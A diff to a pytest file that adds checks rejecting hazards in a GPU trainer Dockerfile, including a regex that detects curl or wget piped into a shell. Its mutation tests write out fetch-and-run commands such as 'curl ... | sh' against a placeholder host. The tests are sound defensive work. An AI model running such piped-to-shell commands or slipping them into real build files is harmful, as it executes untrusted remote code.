@@ -161,6 +161,94 @@ def test_trainer_image_installs_only_from_the_hashed_lock_as_non_root():
     assert (GPU / ".dockerignore").read_text().splitlines() == ["**", "!pyproject.toml", "!uv.lock"]
 
 
+PINNED_PYTHON = "/opt/python/bin/python3.12"
+SECRET_NAME = re.compile(r"TOKEN|KEY|SECRET|PASSWORD|PASSWD|CREDENTIAL", re.I)
+PIPE_TO_SHELL = re.compile(r"\b(?:curl|wget)\b[^\n]*\|\s*(?:sudo\s+)?(?:ba|da|z|k)?sh\b")
+
+
+def instructions(text: str) -> list[str]:
+    """Dockerfile instructions with comments dropped and backslash continuations joined."""
+    lines = [line for line in text.splitlines() if not line.lstrip().startswith("#")]
+    return [i.strip() for i in re.sub(r"\\\n", " ", "\n".join(lines)).splitlines() if i.strip()]
+
+
+def export_command(text: str) -> str:
+    """Only the `uv export` command, not the rest of its `&&` chain."""
+    step = next((s for s in instructions(text) if "uv export" in s), "")
+    return step[step.find("uv export") :].split("&&", 1)[0]
+
+
+def image_hazards(text: str) -> list[str]:
+    hazards = []
+    steps = instructions(text)
+    if any(PIPE_TO_SHELL.search(step) for step in steps):
+        hazards.append("download_piped_to_shell")
+    # No system package is needed; any apt-get would add an unpinned, unhashed dependency.
+    if any(re.search(r"\bapt(?:-get)?\b", step) for step in steps if step.startswith("RUN ")):
+        hazards.append("apt_get_present")
+    names = [m for s in steps if s.startswith("ARG ") for m in re.findall(r"^ARG (\w+)", s)]
+    names += [
+        m for s in steps if s.startswith("ENV ") for m in re.findall(r"(?:^ENV |\s)(\w+)=", s)
+    ]
+    if any(SECRET_NAME.search(name) for name in names):
+        hazards.append("secret_like_build_variable")
+    export = export_command(text)
+    uv_python = any(f"UV_PYTHON={PINNED_PYTHON}" in s for s in steps if s.startswith("ENV "))
+    if f"--python {PINNED_PYTHON}" not in export and not uv_python:
+        hazards.append("export_without_pinned_python")
+    return hazards
+
+
+def test_trainer_image_has_no_shell_download_apt_secret_or_unpinned_interpreter():
+    text = (GPU / "trainer.Dockerfile").read_text()
+    assert image_hazards(text) == []
+    # Both the flag and the environment pin the interpreter; either alone would suffice.
+    assert f"--python {PINNED_PYTHON}" in export_command(text)
+    assert f"UV_PYTHON={PINNED_PYTHON}" in text
+
+
+@pytest.mark.parametrize(
+    ("old", "new", "hazard"),
+    [
+        (
+            "RUN mkdir -p /opt/python",
+            "RUN curl -fsSL https://x.invalid/i | sh && mkdir -p /opt/python",
+            "download_piped_to_shell",
+        ),  # noqa: E501
+        (
+            "RUN mkdir -p /opt/python",
+            "RUN wget -qO- https://x.invalid/i | bash; mkdir -p /opt/python",
+            "download_piped_to_shell",
+        ),  # noqa: E501
+        (
+            "RUN groupadd",
+            "RUN apt-get update && apt-get install -y git && groupadd",
+            "apt_get_present",
+        ),  # noqa: E501
+        ("ARG UV_IMAGE=", "ARG HF_TOKEN\nARG UV_IMAGE=", "secret_like_build_variable"),
+        ("UV_LINK_MODE=copy", "UV_LINK_MODE=copy API_KEY=generated", "secret_like_build_variable"),
+        (
+            "PIP_NO_INDEX=1",
+            "PIP_NO_INDEX=1 REGISTRY_PASSWORD=generated",
+            "secret_like_build_variable",
+        ),  # noqa: E501
+    ],
+)
+def test_image_hazard_checks_reject_each_mutation(old, new, hazard):
+    text = (GPU / "trainer.Dockerfile").read_text()
+    assert text.count(old) == 1
+    assert hazard in image_hazards(text.replace(old, new))
+
+
+def test_export_without_pinned_interpreter_is_rejected():
+    text = (GPU / "trainer.Dockerfile").read_text()
+    unpinned = text.replace(f"--python {PINNED_PYTHON} -o", "-o").replace(
+        f"UV_PYTHON={PINNED_PYTHON}", "UV_PYTHON_PREFERENCE=only-system"
+    )
+    assert unpinned != text
+    assert image_hazards(unpinned) == ["export_without_pinned_python"]
+
+
 def test_readme_names_the_writer_driver_range_and_evidence_limits():
     text = (GPU / "README.md").read_text()
     for required in (
